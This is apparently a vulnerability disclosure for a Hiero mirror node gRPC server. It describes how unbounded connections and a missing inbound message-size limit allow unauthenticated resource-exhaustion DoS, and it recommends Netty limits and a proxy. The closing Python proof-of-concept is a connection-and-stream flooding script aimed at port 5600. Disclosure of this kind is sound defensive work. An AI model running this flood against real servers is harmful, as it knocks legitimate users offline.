### Title
Unbounded Connection Count + Missing `maxInboundMessageSize` in `grpcServerConfigurer` Enables Unauthenticated Resource-Exhaustion / GC-Storm DoS

### Summary
`grpcServerConfigurer()` applies only one Netty limit (`maxConcurrentCallsPerConnection = 5`) and leaves every other protective knob at its framework default or entirely absent. Because there is no ceiling on the number of simultaneous TCP connections and no explicit `maxInboundMessageSize` override, an unprivileged attacker can open an unbounded number of connections, saturate each with 5 streaming calls carrying near-maximum-size request frames, exhaust JVM heap, and trigger repeated stop-the-world GC pauses that stall all Netty I/O threads — producing a network-partition effect for every legitimate client.

### Finding Description
**Exact location**

- `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35
- `grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15

`NettyProperties` exposes exactly one tunable:

```java
private int maxConcurrentCallsPerConnection = 5;   // NettyProperties.java:14
```

`grpcServerConfigurer` applies exactly two settings to the `NettyServerBuilder`:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

A grep across the entire `grpc/**` Java source tree confirms **zero** calls to any of:
- `maxConnections()`
- `maxInboundMessageSize()`
- `maxConnectionIdle()` / `maxConnectionAge()`
- `initialFlowControlWindow()` / `flowControlWindow()`

**Root cause**

The design assumes that capping streams-per-connection to 5 is sufficient to bound total server load. That assumption fails because it does not bound the number of connections. With C connections the attacker controls C × 5 concurrent server-side streams. gRPC-Java's default `maxInboundMessageSize` is **4 MiB**; each stream can carry a 4 MiB request frame that Netty must buffer before dispatching. Total inbound buffer pressure is therefore `C × 5 × 4 MiB`, unbounded in C.

**Exploit flow**

1. Attacker opens C TCP connections to port 5600 (public, no auth for topic subscriptions).
2. On each connection, attacker opens 5 concurrent `subscribeTopic` streaming calls (the per-connection limit is exactly 5, so this is the maximum allowed and is not rejected).
3. Each call carries a request protobuf padded to ~4 MiB (within the default limit).
4. Netty allocates a `ByteBuf` per frame per stream; C × 5 × 4 MiB lands on the JVM heap simultaneously.
5. The `applicationTaskExecutor` thread pool queues C × 5 handler tasks; each task holds reactive pipeline state and a DB cursor reference.
6. Heap fills → GC runs continuously → stop-the-world pauses freeze all Netty event-loop threads → existing legitimate clients receive no responses and time out → network-partition effect.

**Why the only existing check is insufficient**

`maxConcurrentCallsPerConnection = 5` is a *per-connection* limit. It does not prevent opening 10 000 connections. The attacker is not violating any configured rule; every individual connection is well-formed.

### Impact Explanation
Complete denial of service for all connected clients during GC pause windows. Because Netty's I/O threads are JVM threads, a stop-the-world GC pause halts TCP ACKs, keepalive responses, and stream data delivery simultaneously for every client — indistinguishable from a network partition. Severity: **High** (availability, no authentication required, affects all users of the public gRPC API).

### Likelihood Explanation
The gRPC port (5600) is publicly reachable by design. No credentials, tokens, or special protocol knowledge beyond standard gRPC are required. The attack is scriptable with any gRPC client library in a few dozen lines. It is repeatable and can be sustained indefinitely. A single attacker machine with modest socket limits (e.g., 10 000 connections) can allocate ~200 GiB of inbound buffer pressure if the JVM heap allows it, or cause continuous GC thrashing well before that ceiling.

### Recommendation
Add the following calls inside `grpcServerConfigurer()` and expose the corresponding fields in `NettyProperties`:

```java
serverBuilder.maxInboundMessageSize(4 * 1024);          // e.g. 4 KiB — topic requests are tiny
serverBuilder.maxConnectionIdle(30, TimeUnit.SECONDS);  // reclaim idle connections
serverBuilder.maxConnectionAge(5,  TimeUnit.MINUTES);   // force periodic reconnect
serverBuilder.maxConnectionAgeGrace(10, TimeUnit.SECONDS);
// If the Netty version supports it:
// serverBuilder.maxConnections(1000);                  // absolute connection ceiling
```

Additionally, add a `maxConnections` field to `NettyProperties` and enforce it. Deploy an L4/L7 proxy (e.g., Envoy) in front of the gRPC port with per-IP connection-rate limits as a defence-in-depth layer.

### Proof of Concept
```python
import grpc, threading, time
from proto import consensus_service_pb2_grpc, mirror_pb2  # standard mirror-node proto

TARGET = "mirror-node-host:5600"
CONNECTIONS = 500   # adjust to available sockets
STREAMS_PER_CONN = 5
# Pad the filter field to approach 4 MiB
BIG_FILTER = b"A" * (4 * 1024 * 1024 - 256)

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = mirror_pb2.ConsensusTopicQuery(topic_ID=..., filter=BIG_FILTER)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.daemon = True
        t.start()
        threads.append(t)
    time.sleep(120)   # hold connections open

for i in range(CONNECTIONS):
    threading.Thread(target=flood, args=(i,), daemon=True).start()
    time.sleep(0.01)

time.sleep(300)
# Observe: legitimate clients begin timing out; JVM GC logs show continuous
# full-GC cycles; Netty I/O threads show >500 ms pause events.
